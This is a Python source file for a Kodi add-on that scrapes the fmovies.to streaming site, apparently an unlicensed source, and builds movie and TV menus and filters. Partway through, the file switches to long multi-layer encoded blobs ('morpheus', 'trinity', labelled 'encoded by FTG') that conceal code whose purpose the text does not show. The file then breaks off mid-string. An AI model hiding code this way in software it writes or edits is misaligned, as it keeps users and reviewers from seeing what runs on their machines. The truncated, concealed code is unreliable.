# -*- coding: UTF-8 -*-

import sys, os, re, json, base64
if sys.version_info >= (3,0,0):
# for Python 3
    to_unicode = str
    from resources.lib.cmf3 import parseDOM
    from resources.lib.cmf3 import replaceHTMLCodes
    from urllib.parse import unquote, parse_qs, parse_qsl, quote, urlencode, quote_plus

else:
    # for Python 2
    to_unicode = unicode
    from resources.lib.cmf2 import parseDOM
    from resources.lib.cmf2 import replaceHTMLCodes
    from urllib import unquote, quote, urlencode, quote_plus
    from urlparse import parse_qsl, parse_qs
    
import io

from resources.lib import recaptcha_v2

import xbmc, xbmcvfs

import requests
import xbmcgui
import xbmcplugin
import xbmcaddon

import resolveurl 

#urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
base_url = sys.argv[0]
addon_handle = int(sys.argv[1])
params = dict(parse_qsl(sys.argv[2][1:]))
addon = xbmcaddon.Addon(id='plugin.video.fmoviesto')

PATH            = addon.getAddonInfo('path')
try:
    DATAPATH        = xbmcvfs.translatePath(addon.getAddonInfo('profile'))
except:
    DATAPATH    = xbmc.translatePath(addon.getAddonInfo('profile')).decode('utf-8')
    
if not os.path.exists(DATAPATH):
    os.makedirs(DATAPATH)
    
jfilename = os.path.join(DATAPATH,'jfilename')
napisy = os.path.join(DATAPATH,'napisy')

RESOURCES      = PATH+'/resources/'

FANART=RESOURCES+'fanart.jpg'

exlink = params.get('url', None)
nazwa= params.get('title', None)
rys = params.get('image', None)
page = params.get('page',[1])[0]


fsortv = addon.getSetting('fsortV')
fsortn = addon.getSetting('fsortN') if fsortv else 'default'

fkatv = addon.getSetting('fkatV')
fkatn = addon.getSetting('fkatN') if fkatv else 'all'

fkrajv = addon.getSetting('fkrajV')
fkrajn = addon.getSetting('fkrajN') if fkrajv else 'all'

frokv = addon.getSetting('frokV')
frokn = addon.getSetting('frokN') if frokv else 'all'

fwerv = addon.getSetting('fwerV')
fwern = addon.getSetting('fwerN') if fwerv else 'all'

fnapv = addon.getSetting('fnapV')
fnapn = addon.getSetting('fnapN') if fnapv else 'all'

snapv = addon.getSetting('snapV')
snapn = addon.getSetting('snapN') if fnapv else 'all'

ssortv = addon.getSetting('ssortV')
ssortn = addon.getSetting('ssortN') if ssortv else 'default'

skatv = addon.getSetting('skatV')
skatn = addon.getSetting('skatN') if skatv else 'all'

skrajv = addon.getSetting('skrajV')
skrajn = addon.getSetting('skrajN') if skrajv else 'all'

srokv = addon.getSetting('srokV')
srokn = addon.getSetting('srokN') if srokv else 'all'

swerv = addon.getSetting('swerV')
swern = addon.getSetting('swerN') if swerv else 'all'

dataf =  addon.getSetting('fdata')  
datas =  addon.getSetting('sdata')  

wybornapisow = True

UA='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0'

headers = {
    'User-Agent': UA,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'pl,en-US;q=0.7,en;q=0.3',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'TE': 'Trailers',
}
sess = requests.Session()
def build_url(query):
    return base_url + '?' + urlencode(query)

def add_item(url, name, image, mode, folder=False, IsPlayable=False, infoLabels=False, movie=True,itemcount=1, page=1,fanart=FANART,moviescount=0):
    list_item = xbmcgui.ListItem(label=name)
    image = re.sub('.jpg-w\d{2,3}', '.jpg-w400', image)
    if IsPlayable:
        list_item.setProperty("IsPlayable", 'True')
    if not infoLabels:
        infoLabels={'title': name,'plot':name}
    list_item.setInfo(type="video", infoLabels=infoLabels)  
    list_item.setArt({'thumb': image, 'poster': image, 'banner': image, 'icon': image, 'fanart': FANART})
    ok=xbmcplugin.addDirectoryItem(
        handle=addon_handle,
        url = build_url({'mode': mode, 'url' : url, 'page' : page, 'moviescount' : moviescount,'movie':movie,'title':name,'image':image}),          
        listitem=list_item,
        isFolder=folder)
    xbmcplugin.addSortMethod(addon_handle, sortMethod=xbmcplugin.SORT_METHOD_NONE, label2Mask = "%R, %Y, %P")
    return ok
    
def menuMovies():
    add_item('https://fmovies.to/filter?type[]=movie', 'List movies', 'DefaultMovies.png', "listmovies", True)  
    add_item('', "-   [COLOR lightblue]sort:[/COLOR] [B]"+fsortn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fsort', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]country:[/COLOR] [B]"+fkrajn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fkraj', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]genre:[/COLOR] [B]"+fkatn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fkat', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]year:[/COLOR] [B]"+frokn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:frok', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]quality:[/COLOR] [B]"+fwern+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fwer', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]subtitles:[/COLOR] [B]"+fnapn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fnap', folder=False,fanart='')
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)  
    add_item('f', "[I][COLOR violet][B]Reset all filters[/COLOR][/I][/B]",'DefaultAddonService.png', "resetfil", folder=False)

    xbmcplugin.endOfDirectory(addon_handle)
    
def menuTVshows():
    add_item('https://fmovies.to/filter?type[]=series', 'List tv-series', 'DefaultMovies.png', "listmovies", True)  
    add_item('', "-   [COLOR lightblue]sort:[/COLOR] [B]"+ssortn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:ssort', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]country:[/COLOR] [B]"+skrajn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:skraj', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]genre:[/COLOR] [B]"+skatn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:skat', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]year:[/COLOR] [B]"+srokn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:srok', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]quality:[/COLOR] [B]"+swern+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:swer', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]subtitles:[/COLOR] [B]"+snapn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:snap', folder=False,fanart='')
    
    
    add_item('s', "[I][COLOR violet][B]Reset all filters[/COLOR][/I][/B]",'DefaultAddonService.png', "resetfil", folder=False)
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)  
    xbmcplugin.endOfDirectory(addon_handle)
def home():
    add_item('https://fmovies.to/movies', 'Movies', 'DefaultMovies.png', "menumov", True)   
    add_item('https://fmovies.to/movies', 'TV-Series', 'DefaultMovies.png', "menutvs", True)    
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)  

    xbmcplugin.endOfDirectory(addon_handle)
    

def ListMovies(exlink,page):

    links, serials, pagin = getMovies(exlink,page)

    itemz=links
    items = len(links)
    # mud='getLinks'
    fold=True
    # for f in itemz:
        # add_item(name=f.get('title'), url=f.get('href'), mode=mud, image=f.get('img'), folder=fold, infoLabels={'plot':f.get('title'),'title':f.get('title')}, itemcount=items, IsPlayable=False)    
    # itemzx=serials
    # items = len(serials)
    # mud='getseasons'
    # fold=True
    # for f in itemzx:
        # add_item(name=f.get('title'), url=f.get('href'), mode=mud, image=f.get('img'), folder=fold, infoLabels={'plot':f.get('title'),'title':f.get('title')}, itemcount=items)    
    for f in itemz:
        mud = 'getseasons' if '/series/' in f.get('href') else 'getLinks'
        add_item(name=f.get('title'), url=f.get('href'), mode=mud, image=f.get('img'), folder=fold, infoLabels={'plot':f.get('title'),'title':f.get('title')}, itemcount=items, IsPlayable=False)
    if pagin:
        add_item(name='[COLOR blue]>> Next Page [/COLOR]', url=exlink, mode='listmovies', image='', folder=True, page=pagin)
    if links or serials:
        xbmcplugin.setContent(addon_handle, 'videos')   

        xbmcplugin.endOfDirectory(addon_handle)     

import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDY1MzE3NTUwNmYzMDcxMzYzNTU4NzQ0YzJiN2EzOTczMzY1NDdhNzM2MjcwMzM1NzY5NDk3NjRhNTU3OTZjNGU2YTc4NTE3NTRkNDE1MTZkMzc0ZDU0Njc3NDQ1NDgzOTM0NzE1MzYzNTQ2ZjRmNzg0OTU0NzU2NDU4NDgzNzM5NTc1Mzc2NDk1ODU4MzI1YTZlNzQ0NTM4N2E0NTRmNGE0MjQ5NGI0OTM3MzMzNTVhNmUyYjczMmY2NjZhMzE2NTY5Mzk3NTUwMzQzNDM5NjY1ODM0NWE2NjJmNzY0MTY2NzY3OTM1NTMyZjM1NjMyZjJmNTA0YjQ4NjMzOTMzNjMzMzZhMzkyYjY2NTQ2ZTM4Mzc2NjY3NzcyYjJmNGY3NjU4NDY0ODM4Mzc1YTYzMmYzMTRjNjYzMzM1NzUzMTM0MmYzOTc1NzY2NjJmNmUzMTRlN2E2ZTRkNGM3OTJmMzEzNjZhNTAzMzZlNzk3NjcwNjgzNDM0NjIzMzMwNzI3MDM1NjQ3NDRlNWE3OTdhNjQ3NTQ3NmM2NTM5NzY1MDUwMzQ2ODcxNjY3MzZlNmY3ODM1NmQ2YzZkNTI0ZTJmNmU0NDc5MmYyYjM1NTk3ODcyMmI1NzRhNzQ0YzcwNmQ3NDJmNmY2Mjc2NmQ2ODY1Mzg3YTM2Nzg0YzY3MzIzODJiNTg3NTc5Nzc0ZjJmNmE1MDVhNmE0NzQ5NTIyZjZkMzk3MzQ2NjI3MDM1NmQzMDMxNTY3NjYyNGIzMzY0NzE3MjRlNDI3NDU2NTc2YzY4NzE2YTRkNjY1NjZkNDQ2ZDcyNTY0NjZkNzI2MzZkNzU3MjU3NmM3MTcyNGQ2MTdhNTY0YjQ5N2E2MzZhNTEzMDMxNTY3NTRmNzE2YTRiMzE1Njc2NjU1ODYxNjY2YzU1NzE0OTJiNTAzNjU1Njg3MDVhMmI3NTRlNGU2YTU4NGE2MzU5MzkzMzRiN2E3NzdhNzU3NDJmNGI1NjZjNWE2MzYyNjY0YTM4NWE2MTM5NDMzNTRiNmE0ZTdhNTY2NTYyNmU1NjU2NzA2Nzc2MmIzMjQ5MmY1NTY1NDY1MDU2NjEzMTVhMzYzMzU0Mzc2MjQyNGIzODU3MzE1YTQ3NGI0NDRjNzg0ODRlNmUzNTVhMzY0ZDc0NTY3MzRkNjE2OTc5NDc3MjRkNzc3NjY1NjgzOTMzNjEzNjc4NTM0ZDYxMzc1NDU0NjIzMjc5NTA0Njc1NGU1NzM1NzgyZjQ3NzY0YTUzNDQ2MTc1Nzg3NzUwMzY2NzcxMmI1YTVhNjU2MjMwNjE1OTM5Nzc1ODQ4NTc2OTMxNDY2NTZjNGY3NDM2NDE3NjcyMzE1NzY0NmQ2MzcyNGU1YTZkNzA1NTQyNzIzNzQ0NmQ3MTMyNGE2MzMzNDIyZjMwNzMzOTU4NmYzODQxNTY2MjM4NjM0MzM2Mzk1NjczMzU1NjU5MzQ2MjM5NzU0MjUwNzM2NzRiMmIzOTU1NTMzNTJiNDg2NTZhNTczMTM4NWEzMzUwMmY2YzU2NzU0ZDM0NDI2NjU4NDQ0ZjY1NjM3YTRhNTU2MjM0NmU3YTM4Mzc2MTcyMmI2MTMxMmY0OTcyMzQ0MzYzNGQ3NDRiNTA0YjJiNjg3ODRkMmY0MzQ2NjQ1NzU2NmQ1MTU3Mzc2NzJmMzI1MzcyNDY0ODc2MzQ3MDQyNGQzNjYzNDUyZjUxNTIzMzY4NjU2YTU2NzM3MjU0Mzc2MzdhNmU0NDJiNzU1NTc1NzE2YTY3NzY3ODc4NTQ3YTMyNmI2ODU5NGUzNzQ1MzI2MzRlMzE0MTY2MzI0ZTRlNTg2ZjM0NjI3NjQzNTg3NTMwMzg0ZjMwNzMzMzVhMzU3ODcyNGIzMzY2NGM0ZTVhNDE3YTM1NTE1MzM5NzAzNTczNGM3YTY5NTUyZjJiNDEzNzc5NjQ3OTZiNmUzMjY3NTAzMDU2NmI0ZDZkMzQ0ODM1NTY3ODM1NDI1MDJmNjc1YTM1NTE2YjYxNzE1NzJmNmQ1MTc0Nzc3NTVhNzA3MDQ0N2E3OTQ4NTc2NTQyNTQzMjQyNDQ3NDcwNGU2ZjY1MzA0MzZjNmQ1NDdhNjI0NTU4MzU3MDQyNTgzMTMwMzA0NTJmNGE2ZDU1NDg3NTU5Mzg3MjY2NTEzNzcwMzI2YzRiNzY3NTRhNGE3Njc2NDI3NDU2N2EzMzMyNTY0ZjM5NmM0YzZlNmY0OTU4MzMzNDRlMzg2YzQ1NmQzNzQxNmEzMzU5NTIzMTZlMzQ0NDc1NzU2ZjM3Mzc3OTQzNTg0ODQ1NjUzNzQ4NTQ0ZDY2NzQ2MzY2Mzk3ODJmNDE0ZTM3MzQ3MjJiNzQ1NTQ5NzU3OTc5Njg0NzM5MmI2YTc2NTY1MzY3NDIyZjU5NDc3NTVhNTU2ZTc5NmM1MDU0NmU0Yzc1NTU0NzM2MmY2NzQ3NjI0YTU4NzQ0MzQ4NjY2ZjJmMzc0Zjc1NDg0YTJmMzY0NjRmNDMyZjc3N2E2ZTYyNmQ0NzU4Mzk0YTYzNGI2NDRkNDEyYjc5NTQyZjcwNDg0ZDQ4MzE3NTRkNDYzNjUzNTY3MjY3NDY3ODU2MzA1NDQyMmY0YzcxNDUyYjYzNTYzMTQ4NTg0YTc1NTI3MTU0NTg0YzRhN2E0OTdhMzI0ZjM5NDYzMTc3NTQ3NjczNTM1NDM0NTY2NjYzNTQ2ODc1NzE3YTRkNzk0OTY0NGU3NTczNmIyZjM5NDc3ODZmMzIzMzRiNzgzMzcwNjQ2NjJmNGQ0NTJmNTU3NDZhN2E1MzRjMmY0Mjc2NzY1NTU3NjY3MDY1NTg0YjJiMzI0ODMxNGQ0ZDRhMmY0NzY2NjEzNzY4NTY2ZjcwN2EzNTc4NjIzMjcwMzc0OTU4MzE3NTQxNWE3MzQ1NDgyZjUxNmEyYjY3MmYzODYxNzE1ODM5Nzk0ZDRmMmIzMDQxNjYzMjdhNjQ0ZjM4Nzc2YTRkMzg3MDJmMzg0YTUzMmY3NDM3NmE2NjMwNmY3NDM1NTE3ODQxNTg3YTY4MmIzOTU4MzQyZjRiNjEyYjM0Njc2YzMwNDQ3MjM4Njc3NjM5NDE3MjJmNTM2NTQ2N2E2NDQyNzYzNjVhNjU1NTU3Nzk2ZTM1NmU0ZjY0NTEzMzc1NTE0NDJmNTA3OTU5Mzc0OTdhNjY3NTU0NDg2YjQzMzMzNTM5NTM1ODM3NDE0YzJiNTY1MzRmNDk3NzY2NTc2YzM3NzAzNjU4NjYzNTQ5NzgzNTUxNjY2OTY2NTk0YzJiNTE0ZjJiNjM0NTJiNjI0MjMxMzMzMDY3NGM2ZTYxNzY2ZDU1NGY0MTM5MzY2NzMxMmI2ZTQ1NzY2MjMyMmY0OTVhMzkzNDQ1NjU2NzcwMzY1MzYzNGU2ZTY5NzYyZjUxNjczNjc3NGM2MzZhMmY1NzQ5Mzc1MDU5NjM2NjUxMzIzNDU3Mzc1MTU4NzY3NDU0Mzk0MTJmNmQ2NjcxNmU2MjRhNjg2ZTQ1NDkzODZmNjQzNTY4NmEzOTQyNjg2NTVhNzI3MzQzN2E0NTUxNDY2NzQ4NWE2MTRjMmY3NDQ3NGYzODU5NTI3ODQ1NGM2MTRiNjY1OTQxMzM3YTUyNzIzMDcyNzk2YzdhNDc1NzMwNmEzODUxNjQ3NzcyNDc2ZTQyNmU3NDY5NDgzNDQzNzY3ODM4NWE2ODM4Njc1ODM5NDc1MDcwMmI0YTZlNzE3NTQxNTE1YTUxNjIyYjZjNDIyZjJmNTUzODUxNjI3OTUyNGM3YTdhNzc1YTRkNjI2YjM4MzU1Mjc4MzE1MDQ5NjQzMTU4NDMzNzc1NDgzMzU3NTk3MjdhNDc0YjRlNGI0YzU2NjY1OTQ2NTg2OTc0NGI1MTUwNzczNTM5NDk1ODQ1NDQ2NDY0Mzg2YTQ4NWE1NDU2MzU3MTY2NTUzNzc4NDQzOTM5NmY2NjM5NzgzNTczNDM1MDQ5MzA1NjY2MzA0ZDJiNTE0YTU5NTUzODc4NTY3NTQ1Mzc3OTcxMmI2OTU0Mzk0Njc1NDk1MzJmMzY3MTUyNjkzMTUwMzc2OTRkNGYzOTY3NWEzOTY3NDgzNTU5NDUzMDQ2NzY1NDQzNTc0MzczNjI2ZTZiNjY0YzRiMzk2NjMwNGE2MzZmNDk2NDUxNDUzNjVhMzk2YjU4NDk2ODZlNTI3MjU3NTU0OTc1NGM3NTRkNmYzNDY3NTg2OTM5NTk3MDc4NTUzODc0NGUzNjc3NzYzNjc4NjQyYjQ5MzIzNTQ0NWE0MTRjMmI0MzQ4NTA1MTJiNzU0ZDRhMmI3ODc1NDk3MjcyNzM0ZDJiNTIzOTc3NmE1NDY5NDU2NjU3NWE0ZjY1NmY0NDY2NTg2NzM1MzU2ZjcwMzQ3MDM1NzM1MTU5NjQ2ZjM5NWEzNzc5NmUzMTMwNTQ0ZjQyMzY1YTJmNDk2NjcyNDI3NDcwNmUzNDc5NzI3OTQyNGQzNjc2Njg1ODY3NjgyZjQ1MzQ3NDZlNTE3NTUxNDg3YTU4MmY3MTU4Mzk0NTZlNGE0MjJmNmM0NDMwNmQ3ODMzMzI1MTM5MzU0NjQ4NDc1NDJiNjc3NzM0NTI0NjM1NmE2ZTQ3NDcyYjVhNjgzMzUzNjM1YTY2NzczNzM2NjI3OTQ2NGY0MTQ3MzU1MTQ0MzQzNzYyNTczODRmMmI0YjRlNjU3YTUzNmM2ZTU1NzgzNDY1MmI0MzRiNjY0ZDY2Nzk0ODJmNjc1ODVhMzA3MzJiNTE3Mjc4NDczMzU0NGY1MTcwMzI0ZjJiNmQ1YTRhNzk0NTU4NGM2ZjcwNTQ2YTQ0NjU1YTY0NDE3MjJiNDIzNDZjMzg3ODY2Nzk1NjZkNzg0ZTM5NzE2ZTdhNmQzODMxMzQ2ODYyNjk0ZDJmNGE3NDRlMmI2OTc1NWE3NDM2NjIzODY5N2E3ODYzNjc2ZDM3NjEzOTMyN2E0YjQxMzk2ZjJiMzY0OTJiNTU0OTJiNzk0YjYzNTE1ODMwNjE1MjMzNTI0ZTczNmIyZjM0NmU2MzRhNzYzNDQ4NjY0ZDMwMzk3MDRmNzg2ODY4NmM3YTM3NzQ0MTc2NWE1OTQ5NmYzNDc3NjY3MDU4NTU0ZjJmMzI0OTY0NmI1MTM5MzA0ZDM3Njg2ODM2Njc0NDM0NDgzODM5Mzc1NTRiNmM3MDQyNGYzODc1NjI0MTc2Nzg0MTY2NTU0NjJmNDM2YTcyNjE0NzJmMzgzMzU4NjM0MTQ2MzIzMDY0MzM3YTc2NGQ2YTM1Njc1MDYzMzc1MjY0NTE0ODc5NGI1ODZhNTEyZjcxNTg1ODQ5N2EyZjZiNjI2ZjQ4Mzg3MjQ1NDEzMzM4NmY3NjRjNzY0MTY5MzczOTZkNmI1MDM0NDQyYjU2NmE0ZjQ3NzM0YzJmNDE2MzJmNGM0ZTc1NTk0NTM2NDgyZjUzNzI2MTQ4MmI0YjUzNjc3NDJmNzkyYjVhNzIzNzMxNTIzNzcyNmQ'
trinity = '1LGD2ZmV3ZQWvAmZ1AGp5AQR1BQWvZmDmZGD0AmH2BGMyAzZ0MwZ1ZmV2AwHkAmxmZmMuATD2AwD0AQt3ZGWzAQD0BQEuAzZlMwEuAQt2AwMwAGV1AQZmATZ2ZGZkAGN3AwquATD2MGD3AQx0ZmWzATH3LGH2ZzV1AwplAzH1ZQL2AQZ0AwLkZmN3BGZ5Amp1ZwZ1Awx1ZmZ4AmDmAwZ4Awt2AGH0AmD2AQp3AGH3ZwZlATH0MGIuZmtmAGZ0ATL3AGH1ATZ3BGEuAwL3BQD2ZzL0LwIuZmL2BQD3AQt2AGHlZzVmZQquAGL2BQHjAwp0LmZ5AmR3ZGL5AmZ2AmEuZmx3ZQZkAmx3AwMzAzL1LGMwZmN3AmZ2AGN3BQEzAmLmZwEyZzV0AmIuAzZ2AwD3ATV0MQL4AGtlLwLkAGt2LwLlAGp0Zmp2AwpmAmHkAQZlMwZjAQx2AQL5Amp2MGp2AzZ0LmD3AzV2AQL5AwRmAQMuAJR3Zmp3AzD0LwL0AQVmBGpjZmtmAwMyAwx0LwMzA2R2MGMuAQp2MQD5AmtmZGp0AQt1ZQZ5AGN3ZQEuAGt3ZwDlATZ3BQDlAwD0AwWvAwL3AGExAzDmAwp3AGN0LwH2AwH2AQHmZmN3AmL0AQtmAwD2AmLmZwL3AGt3ZwDmATH2AmHlZmp3ZGH3AmNmAwZ4AQpmZQExAzZ2MQHjAwR3AQWzAGDmBGHlZmZ3LGEzAwL1ZGZ2AmZ3ZmLlAQL0Mwp1AGR2LmZ1ATR0Awp5Amx2BQL2AQxmBQZ2Amt1AQH4ATH2ZGLlAQL2AGp5Awx1BGDlZmD0AGZmZmt3LGHjAmV0Mwp0AwxmAmL0AwZ1LGZ4Awp0LmZlAJR3ZQp4A2R3AQD0ZzVmAwplAQD0MwIuATHlMwL5AwZ2AGL5AmDmZQHjAwR2BQEvAzH1ZGZ5ATH0MGL0AGp2BGMwAzRmAGL2Amt3BQH4AQx0BQplATR1ZmEuAwZmAwD2AQt0AwIuAwL1AwWvAmt2ZwZjAGHmBQMyZzV3ZQMvZmp3AGH1ZzL0ZwLmAmp1LGL0AQVmBGD2AzD1Zwp0ATV3AwZ3AGV0AQp5AmN2AQWzAGRmAmZmAQt1AwExAJR2AwWvAwDmZwEwZmx1LGDmAwp2AQMwZmH2BGZmAwD2AQZjZmL1AGDkZmxmAwquAGplLwWzZzL0MwD4AzRlMwH4Amp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